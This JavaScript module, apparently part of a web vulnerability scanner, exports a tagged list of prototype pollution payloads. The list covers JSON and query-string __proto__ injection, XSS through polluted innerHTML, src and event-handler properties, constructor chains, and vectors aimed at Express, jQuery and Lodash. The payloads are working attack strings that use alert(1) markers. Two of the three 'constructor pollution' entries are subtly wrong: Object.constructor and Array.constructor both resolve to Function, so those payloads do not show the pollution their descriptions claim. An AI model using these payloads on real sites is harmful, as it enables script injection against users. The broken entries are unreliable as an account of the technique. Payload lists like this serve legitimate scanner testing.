/**
 * @file prototype-pollution.js
 * @description Prototype pollution XSS vectors
 * @version 8.0.0
 */

(function() {
    'use strict';

    const PROTOTYPE_POLLUTION_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🧬 Basic Prototype Pollution
        // ═══════════════════════════════════════════════════════════════
        basic: [
            {
                id: 'pp_001',
                payload: '{"__proto__":{"polluted":"yes"}}',
                description: 'JSON prototype pollution',
                severity: 'high',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'json']
            },
            {
                id: 'pp_002',
                payload: '__proto__[polluted]=yes',
                description: 'URL parameter pollution',
                severity: 'high',
                contexts: ['url'],
                tags: ['prototype', 'pollution', 'url']
            },
            {
                id: 'pp_003',
                payload: 'constructor.prototype.polluted=yes',
                description: 'Constructor prototype pollution',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['prototype', 'constructor', 'pollution']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎯 XSS via Prototype Pollution
        // ═══════════════════════════════════════════════════════════════
        xss: [
            {
                id: 'pp_xss_001',
                payload: '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
                description: 'Pollute innerHTML',
                severity: 'critical',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'xss', 'innerhtml']
            },
            {
                id: 'pp_xss_002',
                payload: '{"__proto__":{"outerHTML":"<img src=x onerror=alert(1)>"}}',
                description: 'Pollute outerHTML',
                severity: 'critical',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'xss', 'outerhtml']
            },
            {
                id: 'pp_xss_003',
                payload: '{"__proto__":{"src":"javascript:alert(1)"}}',
                description: 'Pollute src attribute',
                severity: 'critical',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'xss', 'src']
            },
            {
                id: 'pp_xss_004',
                payload: '{"__proto__":{"onclick":"alert(1)"}}',
                description: 'Pollute onclick handler',
                severity: 'critical',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'xss', 'onclick']
            },
            {
                id: 'pp_xss_005',
                payload: '{"__proto__":{"onerror":"alert(1)"}}',
                description: 'Pollute onerror handler',
                severity: 'critical',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'xss', 'onerror']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔀 Constructor Pollution
        // ═══════════════════════════════════════════════════════════════
        constructor: [
            {
                id: 'pp_cons_001',
                payload: '<script>Object.constructor.prototype.polluted=true;alert(({}).polluted)</script>',
                description: 'Object constructor pollution',
                severity: 'high',
                contexts: ['html'],
                tags: ['prototype', 'constructor', 'object']
            },
            {
                id: 'pp_cons_002',
                payload: '<script>Array.constructor.prototype.polluted=true;alert([].polluted)</script>',
                description: 'Array constructor pollution',
                severity: 'high',
                contexts: ['html'],
                tags: ['prototype', 'constructor', 'array']
            },
            {
                id: 'pp_cons_003',
                payload: '<script>Function.constructor.prototype.polluted=true;alert((function(){}).polluted)</script>',
                description: 'Function constructor pollution',
                severity: 'high',
                contexts: ['html'],
                tags: ['prototype', 'constructor', 'function']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎭 Payload Chain Exploitation
        // ═══════════════════════════════════════════════════════════════
        chain: [
            {
                id: 'pp_chain_001',
                payload: '{"__proto__":{"__proto__":{"polluted":"yes"}}}',
                description: 'Nested prototype pollution',
                severity: 'high',
                contexts: ['json'],
                tags: ['prototype', 'pollution', 'nested', 'chain']
            },
            {
                id: 'pp_chain_002',
                payload: '{"constructor":{"prototype":{"polluted":"yes"}}}',
                description: 'Constructor chain pollution',
                severity: 'high',
                contexts: ['json'],
                tags: ['prototype', 'constructor', 'chain']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔧 Framework-Specific
        // ═══════════════════════════════════════════════════════════════
        framework: [
            {
                id: 'pp_fw_001',
                payload: '?__proto__[polluted]=yes',
                description: 'Express.js query pollution',
                severity: 'high',
                contexts: ['url'],
                tags: ['prototype', 'express', 'query']
            },
            {
                id: 'pp_fw_002',
                payload: 'constructor[prototype][polluted]=yes',
                description: 'jQuery merge pollution',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['prototype', 'jquery', 'merge']
            },
            {
                id: 'pp_fw_003',
                payload: '__proto__.polluted=yes',
                description: 'Lodash merge pollution',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['prototype', 'lodash', 'merge']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.PROTOTYPE_POLLUTION_PAYLOADS = PROTOTYPE_POLLUTION_PAYLOADS;
    exports.getPayloads = () => {
        const all = [];
        for (const category in PROTOTYPE_POLLUTION_PAYLOADS) {
            all.push(...PROTOTYPE_POLLUTION_PAYLOADS[category]);
        }
        return all;
    };
})();